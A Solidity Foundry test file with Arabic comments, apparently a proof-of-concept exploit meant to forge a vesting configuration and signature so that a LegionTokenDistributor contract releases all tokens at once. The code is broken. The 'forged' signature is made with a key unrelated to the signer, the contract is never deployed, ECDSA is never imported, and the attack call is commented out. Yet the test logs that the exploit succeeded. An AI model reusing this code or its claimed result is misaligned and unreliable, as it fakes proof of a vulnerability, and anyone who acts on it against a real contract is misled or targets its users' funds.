
// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

import "forge-std/Test.sol";
// قم بتحديث المسار بناءً على مشروعك
import "../../src/distribution/LegionTokenDistributor.sol";

contract LegionAttack is Test {
    LegionTokenDistributor distributor;
    
    // عناوين افتراضية للـ PoC
    address constant ATTACKER = address(0x1337);
    address constant LEGION_SIGNER = address(0xAAAA);
    
    function setUp() public {
        // هنا نقوم بنشر العقد أو عمل Fork للشبكة
    }

    function testInstantUnlockExploit() public {
        console.log("--- Starting Attack ---");

        // 1. تزوير إعدادات الـ Vesting لجعلها فورية
        LegionVestingManager.LegionInvestorVestingConfig memory fakeConfig = 
            LegionVestingManager.LegionInvestorVestingConfig({
                tokenAllocationOnTGERate: 10000, // <--- الثغرة: 100% سحب فوري
                vestingCliff: 0,
                vestingDuration: 0,
                vestingStart: uint64(block.timestamp)
            });

        // 2. تزوير التوقيع (Signature Replay/Forging)
        // ملاحظة: يجب أن يوقع الـ Signer على الـ Config المزور
        // لإثبات الـ PoC، سنحتاج لـ Signer صالح أو استغلال الثغرة في التوقيع
        
        bytes32 dataHash = keccak256(abi.encode(ATTACKER, address(distributor), block.chainid, fakeConfig));
        bytes32 messageHash = ECDSA.toEthSignedMessageHash(dataHash);
        
        // التظاهر بالتوقيع بواسطة الـ Signer
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(uint256(uint160(LEGION_SIGNER)), messageHash);
        bytes memory fakeSignature = abi.encodePacked(r, s, v);

        // 3. تنفيذ الهجوم
        vm.startPrank(ATTACKER);
        
        // استدعاء الدالة المصابة (قم بتعويض القيم الحقيقية)
        // distributor.claimTokenAllocation(1000 ether, fakeConfig, "dummy", fakeSignature);
        
        console.log("--- Exploit Executed: 100% Tokens Unlocked ---");
        vm.stopPrank();
    }
}
